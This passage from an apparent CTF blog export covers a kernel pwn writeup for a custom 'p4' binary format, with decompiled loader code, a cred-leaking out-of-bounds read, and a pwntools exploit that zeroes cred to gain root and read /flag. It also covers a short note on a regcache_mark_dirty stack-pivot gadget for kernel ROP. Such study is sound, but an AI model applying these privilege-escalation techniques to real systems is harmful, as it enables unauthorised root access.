<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">module</span>;</span></span><br><span class="line">	<span class="keyword">int</span> (*load_binary)(struct linux_binprm *);</span><br><span class="line">	<span class="keyword">int</span> (*load_shlib)(struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*core_dump)(struct coredump_params *cprm);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_coredump;	<span class="comment">/* minimal dump size */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p><code>p4format</code>中有一个函数指针<code>load_p4_binary</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">load_p4_binary</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  __int64 v9; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v14; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v16; <span class="comment">// r12</span></span><br><span class="line">  __int64 v17; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// r15</span></span><br><span class="line">  __int64 v20; <span class="comment">// r9</span></span><br><span class="line">  __int64 v21; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v23; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">2L</span>L;</span><br><span class="line">  v2 = &amp;unk_272;	<span class="comment">//P4</span></span><br><span class="line">  v3 = a1 + <span class="number">0x48</span>;	<span class="comment">//</span></span><br><span class="line">  v4 = a1;</span><br><span class="line">  v5 = (_BYTE *)(a1 + <span class="number">0x48</span>);</span><br><span class="line">  v6 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = *(_QWORD *)(v6 + <span class="number">0x2A0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = *v2 &lt; *v5;</span><br><span class="line">    v8 = *v2++ == *v5++;</span><br><span class="line">    --v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 );</span><br><span class="line">  <span class="keyword">if</span> ( (!v7 &amp;&amp; !v8) != v7 )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-8</span>;</span><br><span class="line">  JUMPOUT(*(_BYTE *)(v4 + <span class="number">0x4A</span>), <span class="number">0</span>, load_p4_binary_cold_2);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v4 + <span class="number">0x4B</span>) &gt; <span class="number">1u</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">  v10 = flush_old_exec(v4, v2);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v6 + <span class="number">0x80</span>) = <span class="number">0x800000</span>;</span><br><span class="line">    setup_new_exec(v4);</span><br><span class="line">    v12 = *(_BYTE *)(v4 + <span class="number">0x4B</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (__int64 *)(*(_QWORD *)(v4 + <span class="number">0x50</span>) + v3);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v17 = *v16;</span><br><span class="line">          v18 = *v16 &amp; <span class="number">7</span>;</span><br><span class="line">          v19 = *v16 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">          printk(<span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, v19, v16[<span class="number">1</span>], v16[<span class="number">2</span>], v18);</span><br><span class="line">          v20 = v16[<span class="number">2</span>];</span><br><span class="line">          v21 = v16[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">            printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, *v16, v16[<span class="number">1</span>], v22, v23);</span><br><span class="line">            _clear_user(*v16, v16[<span class="number">1</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) &gt; v10 );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="number">-12L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)vm_mmap(</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">0x50</span>),</span><br><span class="line">                               <span class="number">4096L</span>L,</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">0x50</span>) &amp; <span class="number">7L</span>L,</span><br><span class="line">                               <span class="number">2L</span>L,</span><br><span class="line">                               <span class="number">0L</span>L) &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        install_exec_creds(v4);</span><br><span class="line">        set_binfmt(&amp;p4format);</span><br><span class="line">        v14 = <span class="number">140737488351232L</span>L;</span><br><span class="line">        v15 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v15 &amp; <span class="number">0x20000000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">3221225472L</span>L;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(_BYTE *)(v15 + <span class="number">0x83</span>) &amp; <span class="number">8</span>) )</span><br><span class="line">            v14 = <span class="number">4294959104L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = setup_arg_pages(v4, v14, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          finalize_exec(v4);</span><br><span class="line">          start_thread(</span><br><span class="line">            v9 + <span class="number">16216</span>,</span><br><span class="line">            v13,</span><br><span class="line">            *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">256</span>) + <span class="number">40L</span>L));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *(_QWORD *)(v4 + <span class="number">88</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>a1</code>是一个<code>linux_binprm</code>格式的结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> buf[BINPRM_BUF_SIZE];	<span class="comment">//128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vma_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_ARG_PAGES	32</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>[<span class="title">MAX_ARG_PAGES</span>];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> p; <span class="comment">/* current top of mem */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> argmin; <span class="comment">/* rlimit marker for copy_strings() */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * True after the bprm_set_creds hook has been called once</span></span><br><span class="line"><span class="comment">		 * (multiple calls can be made via prepare_binprm() for</span></span><br><span class="line"><span class="comment">		 * binfmt_script/misc).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		called_set_creds:<span class="number">1</span>,</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * True if most recent call to the commoncaps bprm_set_creds</span></span><br><span class="line"><span class="comment">		 * hook (due to multiple prepare_binprm() calls from the</span></span><br><span class="line"><span class="comment">		 * binfmt_script/misc handlers) resulted in elevated</span></span><br><span class="line"><span class="comment">		 * privileges.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		cap_elevated:<span class="number">1</span>,</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Set by bprm_set_creds hook to indicate a privilege-gaining</span></span><br><span class="line"><span class="comment">		 * exec has happened. Used to sanitize execution environment</span></span><br><span class="line"><span class="comment">		 * and to set AT_SECURE auxv for glibc.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		secureexec:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __alpha__</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> taso:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> recursion_depth; <span class="comment">/* only for search_binary_handler() */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span>	<span class="comment">/* new credentials */</span></span><br><span class="line">	<span class="keyword">int</span> unsafe;		<span class="comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> per_clear;	<span class="comment">/* bits to clear in current-&gt;personality */</span></span><br><span class="line">	<span class="keyword">int</span> argc, envc;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * filename;	<span class="comment">/* Name of binary as seen by procps */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * interp;	<span class="comment">/* Name of the binary really executed. Most</span></span><br><span class="line"><span class="comment">				   of the time same as filename, but could be</span></span><br><span class="line"><span class="comment">				   different for binfmt_&#123;misc,script&#125; */</span></span><br><span class="line">	<span class="keyword">unsigned</span> interp_flags;</span><br><span class="line">	<span class="keyword">unsigned</span> interp_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> loader, exec;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim_stack</span>;</span> <span class="comment">/* Saved RLIMIT_STACK used during exec. */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>因为加了<code>__randomize_layout</code>的缘故，编译器在编译的时候，会把结构体填充上一些随机的字段来把结构体混淆，所以以上代码中的<code>a1+0x48</code>是原结构体的<code>buf</code>字段</p>
<p>所以根据代码分析得到，p4类型的可执行文件的格式是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P | 4 | \x00 | \x00 或者 \x01 | mmap的次数 4byte |</span><br><span class="line">mmap的地址相对文件的偏移 8byte，可以是0x18          |</span><br><span class="line">entrypoint, 8byte                              |</span><br><span class="line">mmap的addr，8byte                               |</span><br><span class="line">mmap的length，8byte                             |</span><br><span class="line">mmap的offset，8byte                             |</span><br><span class="line">data.....                                      |</span><br></pre></td></tr></table></figure>

<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>漏洞点位于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v16 = (__int64 *)(*(_QWORD *)(v4 + <span class="number">0x50</span>) + v3);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = *v16;</span><br><span class="line">        v18 = *v16 &amp; <span class="number">7</span>;</span><br><span class="line">        v19 = *v16 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">        printk(<span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, v19, v16[<span class="number">1</span>], v16[<span class="number">2</span>], v18);</span><br><span class="line">        v20 = v16[<span class="number">2</span>];</span><br><span class="line">        v21 = v16[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">          printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, *v16, v16[<span class="number">1</span>], v22, v23);</span><br><span class="line">          _clear_user(*v16, v16[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v10;</span><br><span class="line">        v16 += <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">0x4C</span>) &gt; v10 );</span><br></pre></td></tr></table></figure>

<p>在这里，mmap的次数如果过大，则会导致越界读，这是因为<code>v16</code>是指向<code>linux_binprm</code>结构体的一个指针，如果次数过大，导致v16超出了结构体的<code>buf</code>字段，就会在中间打印调试信息的时候打印出结构体的其他项的信息</p>
<p>而结构体中有当前进程的<code>cred</code>的指针，所以我们能得到<code>cred</code>的地址</p>
<p><code>_clear_user</code>函数会把mmap出来的空间清0，那如果我们把<code>cred</code>给mmap出来，那我们就可以完成提权了</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b"P4"</span>             <span class="comment"># magic</span></span><br><span class="line">payload += p8(<span class="number">0</span>)             <span class="comment"># version</span></span><br><span class="line">payload += p8(<span class="number">1</span>)             <span class="comment"># type</span></span><br><span class="line">payload += p32(<span class="number">2</span>)            <span class="comment"># mapping_count</span></span><br><span class="line">payload += p64(<span class="number">0x18</span>)         <span class="comment"># mapping_offset</span></span><br><span class="line">payload += p64(<span class="number">0x400048</span>)     <span class="comment"># entry</span></span><br><span class="line"></span><br><span class="line">leak_cred = <span class="number">0xffff9855c758c0c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mapping</span></span><br><span class="line">payload += flat(</span><br><span class="line">    <span class="number">0x400000</span> | <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    (leak_cred | <span class="number">8</span>) + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload += asm(shellcraft.cat(<span class="string">"/flag"</span>) + shellcraft.exit())</span><br><span class="line"></span><br><span class="line">print(<span class="string">f'echo <span class="subst">&#123;b64encode(payload).decode()&#125;</span> | base64 -d &gt; a ; chmod +x a ; ./a'</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>linux kernel pwn one_gadget</title>
    <url>/2020/03/15/linux-kernel-pwn-one-gadget/</url>
    <content><![CDATA[<p>linux kernel 下的类似于one_gadget（但不同于glibc中的作用）的内核函数</p>
<p>学习于XNUCA2019 babykernel</p>
<a id="more"></a>

<p><code>regcache_mark_dirty</code>这个函数的地址可以在<code>/proc/kallsyms</code>中查看到，其函数体为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">regcache_mark_dirty</span><span class="params">(struct regmap *<span class="built_in">map</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">map</span>-&gt;lock(<span class="built_in">map</span>-&gt;lock_arg);</span><br><span class="line">	<span class="built_in">map</span>-&gt;cache_dirty = <span class="literal">true</span>;</span><br><span class="line">	<span class="built_in">map</span>-&gt;no_sync_defaults = <span class="literal">true</span>;</span><br><span class="line">	<span class="built_in">map</span>-&gt;unlock(<span class="built_in">map</span>-&gt;lock_arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于regmap的结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">regmap</span> &#123;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">spinlock_t</span> spinlock;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> spinlock_flags;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	regmap_lock lock;</span><br><span class="line">	regmap_unlock unlock;</span><br><span class="line">	<span class="keyword">void</span> *lock_arg; <span class="comment">/* This is passed to lock/unlock functions */</span></span><br><span class="line">	<span class="keyword">gfp_t</span> alloc_flags;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span> <span class="comment">/* Device we do I/O on */</span></span><br><span class="line">	<span class="keyword">void</span> *work_buf;     <span class="comment">/* Scratch buffer used to format I/O */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">regmap_format</span> <span class="title">format</span>;</span>  <span class="comment">/* Buffer format */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">regmap_bus</span> *<span class="title">bus</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *bus_context;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> async;</span><br><span class="line">	<span class="keyword">spinlock_t</span> async_lock;</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> async_waitq;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">async_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">async_free</span>;</span></span><br><span class="line">	<span class="keyword">int</span> async_ret;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_FS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">debugfs</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *debugfs_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> debugfs_reg_len;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> debugfs_val_len;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> debugfs_tot_len;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">debugfs_off_cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">cache_lock</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_register;</span><br><span class="line">	<span class="keyword">bool</span> (*writeable_reg)(struct device *dev, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg);</span><br><span class="line">	<span class="keyword">bool</span> (*readable_reg)(struct device *dev, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg);</span><br><span class="line">	<span class="keyword">bool</span> (*volatile_reg)(struct device *dev, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg);</span><br><span class="line">	<span class="keyword">bool</span> (*precious_reg)(struct device *dev, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg);</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">regmap_access_table</span> *<span class="title">wr_table</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">regmap_access_table</span> *<span class="title">rd_table</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">regmap_access_table</span> *<span class="title">volatile_table</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">regmap_access_table</span> *<span class="title">precious_table</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> (*reg_read)(<span class="keyword">void</span> *context, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg, <span class="keyword">unsigned</span> <span class="keyword">int</span> *val);</span><br><span class="line">	<span class="keyword">int</span> (*reg_write)(<span class="keyword">void</span> *context, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg, <span class="keyword">unsigned</span> <span class="keyword">int</span> val);</span><br><span class="line">	<span class="keyword">int</span> (*reg_update_bits)(<span class="keyword">void</span> *context, <span class="keyword">unsigned</span> <span class="keyword">int</span> reg,</span><br><span class="line">			       <span class="keyword">unsigned</span> <span class="keyword">int</span> mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> val);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> defer_caching;</span><br><span class="line"></span><br><span class="line">	u8 read_flag_mask;</span><br><span class="line">	u8 write_flag_mask;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* number of bits to (left) shift the reg value when formatting*/</span></span><br><span class="line">	<span class="keyword">int</span> reg_shift;</span><br><span class="line">	<span class="keyword">int</span> reg_stride;</span><br><span class="line">	<span class="keyword">int</span> reg_stride_order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* regcache specific members */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">regcache_ops</span> *<span class="title">cache_ops</span>;</span></span><br><span class="line">	<span class="keyword">enum</span> regcache_type cache_type;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* number of bytes in reg_defaults_raw */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cache_size_raw;</span><br><span class="line">	<span class="comment">/* number of bytes per word in reg_defaults_raw */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cache_word_size;</span><br><span class="line">	<span class="comment">/* number of entries in reg_defaults */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_reg_defaults;</span><br><span class="line">	<span class="comment">/* number of entries in reg_defaults_raw */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_reg_defaults_raw;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if set, only the cache is modified not the HW */</span></span><br><span class="line">	<span class="keyword">bool</span> cache_only;</span><br><span class="line">	<span class="comment">/* if set, only the HW is modified not the cache */</span></span><br><span class="line">	<span class="keyword">bool</span> cache_bypass;</span><br><span class="line">	<span class="comment">/* if set, remember to free reg_defaults_raw */</span></span><br><span class="line">	<span class="keyword">bool</span> cache_free;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reg_default</span> *<span class="title">reg_defaults</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">void</span> *reg_defaults_raw;</span><br><span class="line">	<span class="keyword">void</span> *cache;</span><br><span class="line">	<span class="comment">/* if set, the cache contains newer data than the HW */</span></span><br><span class="line">	<span class="keyword">bool</span> cache_dirty;</span><br><span class="line">	<span class="comment">/* if set, the HW registers are known to match map-&gt;reg_defaults */</span></span><br><span class="line">	<span class="keyword">bool</span> no_sync_defaults;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reg_sequence</span> *<span class="title">patch</span>;</span></span><br><span class="line">	<span class="keyword">int</span> patch_regs;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if set, converts bulk read to single read */</span></span><br><span class="line">	<span class="keyword">bool</span> use_single_read;</span><br><span class="line">	<span class="comment">/* if set, converts bulk read to single read */</span></span><br><span class="line">	<span class="keyword">bool</span> use_single_write;</span><br><span class="line">	<span class="comment">/* if set, the device supports multi write mode */</span></span><br><span class="line">	<span class="keyword">bool</span> can_multi_write;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if set, raw reads/writes are limited to this size */</span></span><br><span class="line">	<span class="keyword">size_t</span> max_raw_read;</span><br><span class="line">	<span class="keyword">size_t</span> max_raw_write;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">range_tree</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *selector_work_buf;	<span class="comment">/* Scratch buffer used for selector */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p><code>map-&gt;lock</code>指向mov rdx, rdi</p>
<p><code>map-&gt;lock_arg</code>指向我们的rop链</p>
<p><code>map-&gt;unlock</code>指向栈迁移的指令，例如push rdx; pop rsp;之类的</p>
<p>适用于溢出字节比较少的漏洞</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>空指针公开赛逆向wp</title>
    <url>/2020/03/11/%E7%A9%BA%E6%8C%87%E9%92%88%E5%85%AC%E5%BC%80%E8%B5%9B%E9%80%86%E5%90%91wp/</url>
    <content><![CDATA[<p>除了去花以及最后的flag比较算法挺麻烦的，这道题其实还好</p>
<p>官方wp：<a href="https://mp.weixin.qq.com/s/rMh-hABCdGpYpGqtFFiKOA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/rMh-hABCdGpYpGqtFFiKOA</a></p>
